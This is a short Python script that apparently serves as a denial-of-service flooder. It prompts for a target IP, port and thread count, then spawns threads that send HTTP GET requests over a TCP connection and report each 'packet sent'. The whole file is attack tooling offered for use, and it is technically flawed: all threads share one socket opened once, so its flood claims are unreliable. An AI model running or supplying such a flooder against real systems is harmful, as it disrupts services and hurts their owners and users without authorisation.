import threading
import socket

ip = socket.gethostbyname(input("IP: "))
port = int(input("Port: "))
threads = int(input("Threads: "))

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, port))


def tcp():
    try:
        request = f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode()
        sock.sendall(request)

        print("\033[32m[+]\033[0m TCP Packet sent ->", ip)

    except Exception as err:
        print("\033[31m[-]\033[0m", err)


for i in range(threads):
    t = threading.Thread(target=tcp)
    t.start()

input("")
